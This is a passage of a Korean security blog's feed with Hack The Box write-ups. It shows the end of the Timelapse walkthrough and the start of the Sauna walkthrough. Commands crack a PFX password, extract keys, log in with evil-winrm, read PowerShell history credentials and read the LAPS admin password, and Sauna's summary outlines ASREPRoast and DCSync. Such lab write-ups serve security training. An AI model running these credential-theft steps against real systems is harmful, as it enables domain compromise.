john pfx.john &lt;span class=&quot;token parameter variable&quot;&gt;-w&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;/usr/share/wordlists/rockyou.txt&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;https://velog.velcdn.com/images/h3llanut3lla/post/d78203c3-120d-4138-b366-322001eee2ea/image.png&quot;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code class=&quot;language-text&quot;&gt;legacyy_dev_auth.pfx&lt;/code&gt; 비밀번호: &lt;code class=&quot;language-text&quot;&gt;thuglegacy&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;이제 비밀번호를 얻었으니, SSL 인증서와 개인키를 추출해보자. &lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;sh&quot;&gt;&lt;pre class=&quot;language-sh&quot;&gt;&lt;code class=&quot;language-sh&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;# Pfx 파일에서 개인 키 추출&lt;/span&gt;
openssl pkcs12 &lt;span class=&quot;token parameter variable&quot;&gt;-in&lt;/span&gt; legacyy_dev_auth.pfx &lt;span class=&quot;token parameter variable&quot;&gt;-nocerts&lt;/span&gt; &lt;span class=&quot;token parameter variable&quot;&gt;-out&lt;/span&gt; key.pem &lt;span class=&quot;token parameter variable&quot;&gt;-nodes&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;https://velog.velcdn.com/images/h3llanut3lla/post/fa805b11-08bf-493f-a47b-224a63358dec/image.png&quot;&gt;&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;sh&quot;&gt;&lt;pre class=&quot;language-sh&quot;&gt;&lt;code class=&quot;language-sh&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;# pfx file 파일에서 SSL 인증서 추출&lt;/span&gt;
openssl pkcs12 &lt;span class=&quot;token parameter variable&quot;&gt;-in&lt;/span&gt; legacyy_dev_auth.pfx &lt;span class=&quot;token parameter variable&quot;&gt;-nokeys&lt;/span&gt; &lt;span class=&quot;token parameter variable&quot;&gt;-out&lt;/span&gt; cert.pem&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;https://velog.velcdn.com/images/h3llanut3lla/post/664683bf-8517-470c-acd7-09222cf5efaa/image.png&quot;&gt;&lt;/p&gt;
&lt;h2 id=&quot;초입&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%EC%B4%88%EC%9E%85&quot; aria-label=&quot;초입 permalink&quot; class=&quot;heading-anchor before&quot;&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; width=&quot;15&quot; height=&quot;15&quot; viewBox=&quot;0 0 24 24&quot;&gt;&lt;path d=&quot;M6.188 8.719c.439-.439.926-.801 1.444-1.087 2.887-1.591 6.589-.745 8.445 2.069l-2.246 2.245c-.644-1.469-2.243-2.305-3.834-1.949-.599.134-1.168.433-1.633.898l-4.304 4.306c-1.307 1.307-1.307 3.433 0 4.74 1.307 1.307 3.433 1.307 4.74 0l1.327-1.327c1.207.479 2.501.67 3.779.575l-2.929 2.929c-2.511 2.511-6.582 2.511-9.093 0s-2.511-6.582 0-9.093l4.304-4.306zm6.836-6.836l-2.929 2.929c1.277-.096 2.572.096 3.779.574l1.326-1.326c1.307-1.307 3.433-1.307 4.74 0 1.307 1.307 1.307 3.433 0 4.74l-4.305 4.305c-1.311 1.311-3.44 1.3-4.74 0-.303-.303-.564-.68-.727-1.051l-2.246 2.245c.236.358.481.667.796.982.812.812 1.846 1.417 3.036 1.704 1.542.371 3.194.166 4.613-.617.518-.286 1.005-.648 1.444-1.087l4.304-4.305c2.512-2.511 2.512-6.582.001-9.093-2.511-2.51-6.581-2.51-9.092 0z&quot;/&gt;&lt;/svg&gt;&lt;/a&gt;초입&lt;/h2&gt;
&lt;p&gt;현재까지 상황을 정리해보자면, &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;SSL 인증서와 개인 키 획득&lt;/li&gt;
&lt;li&gt;포트 5986이 SSL을 이용한 WinRM 이라는 것. &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;그렇다면 SSL 인증서와 개인 키를 활용해서 Evil-WinRM을 이용하면 초입이 가능할까?&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;sh&quot;&gt;&lt;pre class=&quot;language-sh&quot;&gt;&lt;code class=&quot;language-sh&quot;&gt;evil-winrm &lt;span class=&quot;token parameter variable&quot;&gt;-i&lt;/span&gt; timelapse.htb &lt;span class=&quot;token parameter variable&quot;&gt;-S&lt;/span&gt; &lt;span class=&quot;token parameter variable&quot;&gt;-k&lt;/span&gt; legacyy_dev_auth.key &lt;span class=&quot;token parameter variable&quot;&gt;-c&lt;/span&gt; legacyy_dev_auth.crt&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;https://velog.velcdn.com/images/h3llanut3lla/post/5e1e2cc1-b9f9-4eef-a026-29cf220bd9ef/image.png&quot;&gt;&lt;/p&gt;
&lt;p&gt;가능하다. &lt;/p&gt;
&lt;h2 id=&quot;권한상승&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%EA%B6%8C%ED%95%9C%EC%83%81%EC%8A%B9&quot; aria-label=&quot;권한상승 permalink&quot; class=&quot;heading-anchor before&quot;&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; width=&quot;15&quot; height=&quot;15&quot; viewBox=&quot;0 0 24 24&quot;&gt;&lt;path d=&quot;M6.188 8.719c.439-.439.926-.801 1.444-1.087 2.887-1.591 6.589-.745 8.445 2.069l-2.246 2.245c-.644-1.469-2.243-2.305-3.834-1.949-.599.134-1.168.433-1.633.898l-4.304 4.306c-1.307 1.307-1.307 3.433 0 4.74 1.307 1.307 3.433 1.307 4.74 0l1.327-1.327c1.207.479 2.501.67 3.779.575l-2.929 2.929c-2.511 2.511-6.582 2.511-9.093 0s-2.511-6.582 0-9.093l4.304-4.306zm6.836-6.836l-2.929 2.929c1.277-.096 2.572.096 3.779.574l1.326-1.326c1.307-1.307 3.433-1.307 4.74 0 1.307 1.307 1.307 3.433 0 4.74l-4.305 4.305c-1.311 1.311-3.44 1.3-4.74 0-.303-.303-.564-.68-.727-1.051l-2.246 2.245c.236.358.481.667.796.982.812.812 1.846 1.417 3.036 1.704 1.542.371 3.194.166 4.613-.617.518-.286 1.005-.648 1.444-1.087l4.304-4.305c2.512-2.511 2.512-6.582.001-9.093-2.511-2.51-6.581-2.51-9.092 0z&quot;/&gt;&lt;/svg&gt;&lt;/a&gt;권한상승&lt;/h2&gt;
&lt;h3 id=&quot;svc_deploy&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#svc_deploy&quot; aria-label=&quot;svc_deploy permalink&quot; class=&quot;heading-anchor before&quot;&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; width=&quot;15&quot; height=&quot;15&quot; viewBox=&quot;0 0 24 24&quot;&gt;&lt;path d=&quot;M6.188 8.719c.439-.439.926-.801 1.444-1.087 2.887-1.591 6.589-.745 8.445 2.069l-2.246 2.245c-.644-1.469-2.243-2.305-3.834-1.949-.599.134-1.168.433-1.633.898l-4.304 4.306c-1.307 1.307-1.307 3.433 0 4.74 1.307 1.307 3.433 1.307 4.74 0l1.327-1.327c1.207.479 2.501.67 3.779.575l-2.929 2.929c-2.511 2.511-6.582 2.511-9.093 0s-2.511-6.582 0-9.093l4.304-4.306zm6.836-6.836l-2.929 2.929c1.277-.096 2.572.096 3.779.574l1.326-1.326c1.307-1.307 3.433-1.307 4.74 0 1.307 1.307 1.307 3.433 0 4.74l-4.305 4.305c-1.311 1.311-3.44 1.3-4.74 0-.303-.303-.564-.68-.727-1.051l-2.246 2.245c.236.358.481.667.796.982.812.812 1.846 1.417 3.036 1.704 1.542.371 3.194.166 4.613-.617.518-.286 1.005-.648 1.444-1.087l4.304-4.305c2.512-2.511 2.512-6.582.001-9.093-2.511-2.51-6.581-2.51-9.092 0z&quot;/&gt;&lt;/svg&gt;&lt;/a&gt;svc_deploy&lt;/h3&gt;
&lt;p&gt;파워쉘 히스토리 로그를 살펴보자. &lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;powershell&quot;&gt;&lt;pre class=&quot;language-powershell&quot;&gt;&lt;code class=&quot;language-powershell&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;# Read history&lt;/span&gt;
&lt;span class=&quot;token function&quot;&gt;type&lt;/span&gt; &lt;span class=&quot;token variable&quot;&gt;$env&lt;/span&gt;:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;txt&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;https://velog.velcdn.com/images/h3llanut3lla/post/37799010-c3a2-4eab-b22e-c37fd79dc7d9/image.png&quot;&gt;&lt;/p&gt;
&lt;p&gt;상단에서 5번째, 6번째줄에서 각각 비밀번호와 사용자명을 볼 수 있다. &lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;powershell&quot;&gt;&lt;pre class=&quot;language-powershell&quot;&gt;&lt;code class=&quot;language-powershell&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;# 비밀번호&lt;/span&gt;
&lt;span class=&quot;token variable&quot;&gt;$p&lt;/span&gt; = &lt;span class=&quot;token function&quot;&gt;ConvertTo-SecureString&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;E3R$Q62^12p7PLlC%KWaxuaV&apos;&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;-&lt;/span&gt;AsPlainText &lt;span class=&quot;token operator&quot;&gt;-&lt;/span&gt;Force

&lt;span class=&quot;token comment&quot;&gt;# 사용자명&lt;/span&gt;
&lt;span class=&quot;token variable&quot;&gt;$c&lt;/span&gt; = &lt;span class=&quot;token function&quot;&gt;New-Object&lt;/span&gt; System&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;Management&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;Automation&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;PSCredential &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&apos;svc_deploy&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token variable&quot;&gt;$p&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;ul&gt;
&lt;li&gt;사용자명: &lt;code class=&quot;language-text&quot;&gt;svc_deploy&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;비밀번호: &lt;code class=&quot;language-text&quot;&gt;E3R$Q62^12p7PLlC%KWaxuaV&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;그럼 이제 새로 얻은 자격증명으로 새 세션을 열여보자. &lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://velog.velcdn.com/images/h3llanut3lla/post/b2cec5c0-567b-40a2-bd7f-04b1ae5f385c/image.png&quot;&gt;&lt;/p&gt;
&lt;h3 id=&quot;관리자&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%EA%B4%80%EB%A6%AC%EC%9E%90&quot; aria-label=&quot;관리자 permalink&quot; class=&quot;heading-anchor before&quot;&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; width=&quot;15&quot; height=&quot;15&quot; viewBox=&quot;0 0 24 24&quot;&gt;&lt;path d=&quot;M6.188 8.719c.439-.439.926-.801 1.444-1.087 2.887-1.591 6.589-.745 8.445 2.069l-2.246 2.245c-.644-1.469-2.243-2.305-3.834-1.949-.599.134-1.168.433-1.633.898l-4.304 4.306c-1.307 1.307-1.307 3.433 0 4.74 1.307 1.307 3.433 1.307 4.74 0l1.327-1.327c1.207.479 2.501.67 3.779.575l-2.929 2.929c-2.511 2.511-6.582 2.511-9.093 0s-2.511-6.582 0-9.093l4.304-4.306zm6.836-6.836l-2.929 2.929c1.277-.096 2.572.096 3.779.574l1.326-1.326c1.307-1.307 3.433-1.307 4.74 0 1.307 1.307 1.307 3.433 0 4.74l-4.305 4.305c-1.311 1.311-3.44 1.3-4.74 0-.303-.303-.564-.68-.727-1.051l-2.246 2.245c.236.358.481.667.796.982.812.812 1.846 1.417 3.036 1.704 1.542.371 3.194.166 4.613-.617.518-.286 1.005-.648 1.444-1.087l4.304-4.305c2.512-2.511 2.512-6.582.001-9.093-2.511-2.51-6.581-2.51-9.092 0z&quot;/&gt;&lt;/svg&gt;&lt;/a&gt;관리자&lt;/h3&gt;
&lt;p&gt;현 사용자를 열거해보자. &lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://velog.velcdn.com/images/h3llanut3lla/post/679c0677-bd6b-4b4a-804a-7b725b413ef8/image.png&quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;Remote Management Use&lt;/code&gt;는 좀 본 것 같은데, &lt;code class=&quot;language-text&quot;&gt;LAPs_Readers&lt;/code&gt;는 생소하다. &lt;/p&gt;
&lt;h4 id=&quot;LAPS&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#LAPS&quot; aria-label=&quot;LAPS permalink&quot; class=&quot;heading-anchor before&quot;&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; width=&quot;15&quot; height=&quot;15&quot; viewBox=&quot;0 0 24 24&quot;&gt;&lt;path d=&quot;M6.188 8.719c.439-.439.926-.801 1.444-1.087 2.887-1.591 6.589-.745 8.445 2.069l-2.246 2.245c-.644-1.469-2.243-2.305-3.834-1.949-.599.134-1.168.433-1.633.898l-4.304 4.306c-1.307 1.307-1.307 3.433 0 4.74 1.307 1.307 3.433 1.307 4.74 0l1.327-1.327c1.207.479 2.501.67 3.779.575l-2.929 2.929c-2.511 2.511-6.582 2.511-9.093 0s-2.511-6.582 0-9.093l4.304-4.306zm6.836-6.836l-2.929 2.929c1.277-.096 2.572.096 3.779.574l1.326-1.326c1.307-1.307 3.433-1.307 4.74 0 1.307 1.307 1.307 3.433 0 4.74l-4.305 4.305c-1.311 1.311-3.44 1.3-4.74 0-.303-.303-.564-.68-.727-1.051l-2.246 2.245c.236.358.481.667.796.982.812.812 1.846 1.417 3.036 1.704 1.542.371 3.194.166 4.613-.617.518-.286 1.005-.648 1.444-1.087l4.304-4.305c2.512-2.511 2.512-6.582.001-9.093-2.511-2.51-6.581-2.51-9.092 0z&quot;/&gt;&lt;/svg&gt;&lt;/a&gt;LAPS&lt;/h4&gt;
&lt;p&gt;LAPS는 로컬 관리자 비밀번호 솔루션이다.컴퓨터의 로컬 관리자 계정 비밀번호를 관리하고 보호하는 데 도움이 되는 윈도우즈 기능이다. &lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.thehacker.recipes/ad/movement/dacl/readlapspassword&quot;&gt;이 글&lt;/a&gt;을 읽어보면 LAPS 비밀번호를 남용하는 법이 나온다.&lt;/p&gt;
&lt;p&gt;위 글을 요약 하자면:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;LAPS용으로 구성된 대상 컴퓨터에서 &lt;code class=&quot;language-text&quot;&gt;GenericAll&lt;/code&gt; 또는 &lt;code class=&quot;language-text&quot;&gt;AllExtendedRights&lt;/code&gt; 또는 도메인 단위 동기화를 위한 &lt;code class=&quot;language-text&quot;&gt;GetChanges&lt;/code&gt; 및 &lt;code class=&quot;language-text&quot;&gt;GetChangesInFilteredSet&lt;/code&gt; 또는 &lt;code class=&quot;language-text&quot;&gt;GetChangesAll&lt;/code&gt;의 조합이 있는 개체를 제어할 때 사용 가능한 방법임.&lt;/li&gt;
&lt;li&gt;공격자는 컴퓨터 계정의 LAPS 비밀번호(즉, 컴퓨터 로컬 관리자의 비밀번호)를 읽을 수 있음. &lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;powershell&quot;&gt;&lt;pre class=&quot;language-powershell&quot;&gt;&lt;code class=&quot;language-powershell&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;# 관리자 비밀번호 열거&lt;/span&gt;
&lt;span class=&quot;token function&quot;&gt;Get-ADComputer&lt;/span&gt; DC01 &lt;span class=&quot;token operator&quot;&gt;-&lt;/span&gt;property &lt;span class=&quot;token string&quot;&gt;&apos;ms-mcs-admpwd&apos;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;https://velog.velcdn.com/images/h3llanut3lla/post/ecba22e8-ba45-4d81-af03-21fee22633f9/image.png&quot;&gt;&lt;/p&gt;
&lt;p&gt;비밀번호 획득!&lt;/p&gt;
&lt;p&gt;이제 Evil-WinRM을 이용하여 관리자 세션을 열면 된다. &lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://velog.velcdn.com/images/h3llanut3lla/post/f203b992-43b5-40aa-b990-b034c18318f5/image.png&quot;&gt;&lt;/p&gt;</content:encoded></item><item><title><![CDATA[Sauna]]></title><description><![CDATA[Sauna 요약  🌟 한 줄 평 액티브 디렉토리의 기본적인 공격 요소 및 정보 수집 방법들을 경험할 수 있는 시스템인데, 잘 만들었다고 소문난 Pro Labs의 Dante를 만든 제작자 (egotisticalSW…]]></description><link>https://h3llanut3lla.github.io/Sauna/</link><guid isPermaLink="false">https://h3llanut3lla.github.io/Sauna/</guid><pubDate>Sun, 09 Feb 2025 00:00:00 GMT</pubDate><content:encoded>&lt;h2 id=&quot;Sauna-요약&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#Sauna-%EC%9A%94%EC%95%BD&quot; aria-label=&quot;Sauna 요약 permalink&quot; class=&quot;heading-anchor before&quot;&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; width=&quot;15&quot; height=&quot;15&quot; viewBox=&quot;0 0 24 24&quot;&gt;&lt;path d=&quot;M6.188 8.719c.439-.439.926-.801 1.444-1.087 2.887-1.591 6.589-.745 8.445 2.069l-2.246 2.245c-.644-1.469-2.243-2.305-3.834-1.949-.599.134-1.168.433-1.633.898l-4.304 4.306c-1.307 1.307-1.307 3.433 0 4.74 1.307 1.307 3.433 1.307 4.74 0l1.327-1.327c1.207.479 2.501.67 3.779.575l-2.929 2.929c-2.511 2.511-6.582 2.511-9.093 0s-2.511-6.582 0-9.093l4.304-4.306zm6.836-6.836l-2.929 2.929c1.277-.096 2.572.096 3.779.574l1.326-1.326c1.307-1.307 3.433-1.307 4.74 0 1.307 1.307 1.307 3.433 0 4.74l-4.305 4.305c-1.311 1.311-3.44 1.3-4.74 0-.303-.303-.564-.68-.727-1.051l-2.246 2.245c.236.358.481.667.796.982.812.812 1.846 1.417 3.036 1.704 1.542.371 3.194.166 4.613-.617.518-.286 1.005-.648 1.444-1.087l4.304-4.305c2.512-2.511 2.512-6.582.001-9.093-2.511-2.51-6.581-2.51-9.092 0z&quot;/&gt;&lt;/svg&gt;&lt;/a&gt;Sauna 요약&lt;/h2&gt;
&lt;p&gt;&lt;img src=&quot;https://velog.velcdn.com/images/h3llanut3lla/post/4a06e187-1d98-4268-9540-f1c4a459e2df/image.png&quot;&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;🌟 &lt;strong&gt;한 줄 평&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;액티브 디렉토리의 기본적인 공격 요소 및 정보 수집 방법들을 경험할 수 있는 시스템인데, 잘 만들었다고 소문난 Pro Labs의 Dante를 만든 제작자 (egotisticalSW)가 만든 시스템이라 그런지 핵더박스내에서도 인기가 높다. &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;사우나는 Active Directory 열거 및 활용 기능을 갖춘 쉬운 난이도의 윈도우즈 시스템이다. &lt;/p&gt;
&lt;p&gt;웹사이트에 나와 있는 직원 이름을 활용하여 사용자 이름 리스트를 만들어 ASREPRoasting 공격에 사용하면 컬브로스 사전 인증 (Kerberos pre-authentication)이 필요하지 않은 계정에 대한 해시를 얻을 수 있다. 이 해시를 이용하여 오프라인 무차별 대입 공격 (Offline brute force attack)을 수행 하게 되면 WinRM을 실행 할 수 있는 사용자 계정의 일반 텍스트 비밀번호를 얻을 수 있다. &lt;/p&gt;
&lt;p&gt;권한상승을 위한 정보 수집으로 WinPEAS를 실행하면 다른 시스템 사용자가 자동 로그인 설정을 해두었다는 사실과 비밀번호를 함께 확인 할 수 있다. 블러드하운드 (BloodHound)를 이용하면 이 사용자에게는 디씨씽크 (DCSync) 공격 시 도메인 컨트롤러에서 암호 해시를 덤프할 수 있는 &lt;code class=&quot;language-text&quot;&gt;DS-Replication-Get-Changes-All&lt;/code&gt; 확장 권한이 있다는 것을 알 수 있다. 이 공격을 실행하면 주 도메인 관리자의 해쉬를 얻을 수 있으며 이는 임패킷 (Impacket)의 피에스이그젝 (psexec.py)과 함께 사용함으로써 상승된 권한인 &lt;code class=&quot;language-text&quot;&gt;NT_AUTHORITY\SYSTEM&lt;/code&gt; 으로써 쉘을 열 수 있다. &lt;/p&gt;
&lt;h2 id=&quot;정보-수집&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%EC%A0%95%EB%B3%B4-%EC%88%98%EC%A7%91&quot; aria-label=&quot;정보 수집 permalink&quot; class=&quot;heading-anchor before&quot;&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; width=&quot;15&quot; height=&quot;15&quot; viewBox=&quot;0 0 24 24&quot;&gt;&lt;path d=&quot;M6.188 8.719c.439-.439.926-.801 1.444-1.087 2.887-1.591 6.589-.745 8.445 2.069l-2.246 2.245c-.644-1.469-2.243-2.305-3.834-1.949-.599.134-1.168.433-1.633.898l-4.304 4.306c-1.307 1.307-1.307 3.433 0 4.74 1.307 1.307 3.433 1.307 4.74 0l1.327-1.327c1.207.479 2.501.67 3.779.575l-2.929 2.929c-2.511 2.511-6.582 2.511-9.093 0s-2.511-6.582 0-9.093l4.304-4.306zm6.836-6.836l-2.929 2.929c1.277-.096 2.572.096 3.779.574l1.326-1.326c1.307-1.307 3.433-1.307 4.74 0 1.307 1.307 1.307 3.433 0 4.74l-4.305 4.305c-1.311 1.311-3.44 1.3-4.74 0-.303-.303-.564-.68-.727-1.051l-2.246 2.245c.236.358.481.667.796.982.812.812 1.846 1.417 3.036 1.704 1.542.371 3.194.166 4.613-.617.518-.286 1.005-.648 1.444-1.087l4.304-4.305c2.512-2.511 2.512-6.582.001-9.093-2.511-2.51-6.581-2.51-9.092 0z&quot;/&gt;&lt;/svg&gt;&lt;/a&gt;정보 수집&lt;/h2&gt;
&lt;h3 id=&quot;Nmap-포트-스캔&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#Nmap-%ED%8F%AC%ED%8A%B8-%EC%8A%A4%EC%BA%94&quot; aria-label=&quot;Nmap 포트 스캔 permalink&quot; class=&quot;heading-anchor before&quot;&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; width=&quot;15&quot; height=&quot;15&quot; viewBox=&quot;0 0 24 24&quot;&gt;&lt;path d=&quot;M6.188 8.719c.439-.439.926-.801 1.444-1.087 2.887-1.591 6.589-.745 8.445 2.069l-2.246 2.245c-.644-1.469-2.243-2.305-3.834-1.949-.599.134-1.168.433-1.633.898l-4.304 4.306c-1.307 1.307-1.307 3.433 0 4.74 1.307 1.307 3.433 1.307 4.74 0l1.327-1.327c1.207.479 2.501.67 3.779.575l-2.929 2.929c-2.511 2.511-6.582 2.511-9.093 0s-2.511-6.582 0-9.093l4.304-4.306zm6.836-6.836l-2.929 2.929c1.277-.096 2.572.096 3.779.574l1.326-1.326c1.307-1.307 3.433-1.307 4.74 0 1.307 1.307 1.307 3.433 0 4.74l-4.305 4.305c-1.311 1.311-3.44 1.3-4.74 0-.303-.303-.564-.68-.727-1.051l-2.246 2.245c.236.358.481.667.796.982.812.812 1.846 1.417 3.036 1.704 1.542.371 3.194.166 4.613-.617.518-.286 1.005-.648 1.444-1.087l4.304-4.305c2.512-2.511 2.512-6.582.001-9.093-2.511-2.51-6.581-2.51-9.092 0z&quot;/&gt;&lt;/svg&gt;&lt;/a&gt;Nmap 포트 스캔&lt;/h3&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;sh&quot;&gt;&lt;pre class=&quot;language-sh&quot;&gt;&lt;code class=&quot;language-sh&quot;&gt;PORT      STATE SERVICE                    
&lt;span class=&quot;token number&quot;&gt;53&lt;/span&gt;/tcp    &lt;span class=&quot;token function&quot;&gt;open&lt;/span&gt;  domain 
&lt;span class=&quot;token number&quot;&gt;80&lt;/span&gt;/tcp    &lt;span class=&quot;token function&quot;&gt;open&lt;/span&gt;  http
&lt;span class=&quot;token number&quot;&gt;88&lt;/span&gt;/tcp    &lt;span class=&quot;token function&quot;&gt;open&lt;/span&gt;  kerberos-sec
&lt;span class=&quot;token number&quot;&gt;135&lt;/span&gt;/tcp   &lt;span class=&quot;token function&quot;&gt;open&lt;/span&gt;  msrpc
&lt;span class=&quot;token number&quot;&gt;139&lt;/span&gt;/tcp   &lt;span class=&quot;token function&quot;&gt;open&lt;/span&gt;  netbios-ssn
&lt;span class=&quot;token number&quot;&gt;389&lt;/span&gt;/tcp   &lt;span class=&quot;token function&quot;&gt;open&lt;/span&gt;  ldap
&lt;span class=&quot;token number&quot;&gt;445&lt;/span&gt;/tcp   &lt;span class=&quot;token function&quot;&gt;open&lt;/span&gt;  microsoft-ds                          
&lt;span class=&quot;token number&quot;&gt;464&lt;/span&gt;/tcp   &lt;span class=&quot;token function&quot;&gt;open&lt;/span&gt;  kpasswd5
&lt;span class=&quot;token number&quot;&gt;593&lt;/span&gt;/tcp   &lt;span class=&quot;token function&quot;&gt;open&lt;/span&gt;  http-rpc-epmap
&lt;span class=&quot;token number&quot;&gt;636&lt;/span&gt;/tcp   &lt;span class=&quot;token function&quot;&gt;open&lt;/span&gt;  ldapssl
&lt;span class=&quot;token number&quot;&gt;3268&lt;/span&gt;/tcp  &lt;span class=&quot;token function&quot;&gt;open&lt;/span&gt;  globalcatLDAP              
&lt;span class=&quot;token number&quot;&gt;3269&lt;/span&gt;/tcp  &lt;span class=&quot;token function&quot;&gt;open&lt;/span&gt;  globalcatLDAPssl
&lt;span class=&quot;token number&quot;&gt;5985&lt;/span&gt;/tcp  &lt;span class=&quot;token function&quot;&gt;open&lt;/span&gt;  wsman
&lt;span class=&quot;token number&quot;&gt;9389&lt;/span&gt;/tcp  &lt;span class=&quot;token function&quot;&gt;open&lt;/span&gt;  adws
&lt;span class=&quot;token number&quot;&gt;49667&lt;/span&gt;/tcp &lt;span class=&quot;token function&quot;&gt;open&lt;/span&gt;  unknown
&lt;span class=&quot;token number&quot;&gt;49669&lt;/span&gt;/tcp &lt;span class=&quot;token function&quot;&gt;open&lt;/span&gt;  unknown
&lt;span class=&quot;token number&quot;&gt;49670&lt;/span&gt;/tcp &lt;span class=&quot;token function&quot;&gt;open&lt;/span&gt;  unknown
&lt;span class=&quot;token number&quot;&gt;49671&lt;/span&gt;/tcp &lt;span class=&quot;token function&quot;&gt;open&lt;/span&gt;  unknown
&lt;span class=&quot;token number&quot;&gt;49681&lt;/span&gt;/tcp &lt;span class=&quot;token function&quot;&gt;open&lt;/span&gt;  unknown
&lt;span class=&quot;token number&quot;&gt;64471&lt;/span&gt;/tcp &lt;span class=&quot;token function&quot;&gt;open&lt;/span&gt;  unknown&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;ul&gt;
&lt;li&gt;디렉토리 퍼징 (Directory Fuzzing) 에서는 딱히 눈에 띄는 폴더는 없었다. &lt;/li&gt;
&lt;li&gt;LDAP을 열거하면 도메인명 &lt;code class=&quot;language-text&quot;&gt;egotistical-bank.local&lt;/code&gt; 을 확인 할 수 있다. &lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&quot;80-HTTP&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#80-HTTP&quot; aria-label=&quot;80 HTTP permalink&quot; class=&quot;heading-anchor before&quot;&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; width=&quot;15&quot; height=&quot;15&quot; viewBox=&quot;0 0 24 24&quot;&gt;&lt;path d=&quot;M6.188 8.719c.439-.439.926-.801 1.444-1.087 2.887-1.591 6.589-.745 8.445 2.069l-2.246 2.245c-.644-1.469-2.243-2.305-3.834-1.949-.599.134-1.168.433-1.633.898l-4.304 4.306c-1.307 1.307-1.307 3.433 0 4.74 1.307 1.307 3.433 1.307 4.74 0l1.327-1.327c1.207.479 2.501.67 3.779.575l-2.929 2.929c-2.511 2.511-6.582 2.511-9.093 0s-2.511-6.582 0-9.093l4.304-4.306zm6.836-6.836l-2.929 2.929c1.277-.096 2.572.096 3.779.574l1.326-1.326c1.307-1.307 3.433-1.307 4.74 0 1.307 1.307 1.307 3.433 0 4.74l-4.305 4.305c-1.311 1.311-3.44 1.3-4.74 0-.303-.303-.564-.68-.727-1.051l-2.246 2.245c.236.358.481.667.796.982.812.812 1.846 1.417 3.036 1.704 1.542.371 3.194.166 4.613-.617.518-.286 1.005-.648 1.444-1.087l4.304-4.305c2.512-2.511 2.512-6.582.001-9.093-2.511-2.51-6.581-2.51-9.092 0z&quot;/&gt;&lt;/svg&gt;&lt;/a&gt;80-HTTP&lt;/h3&gt;
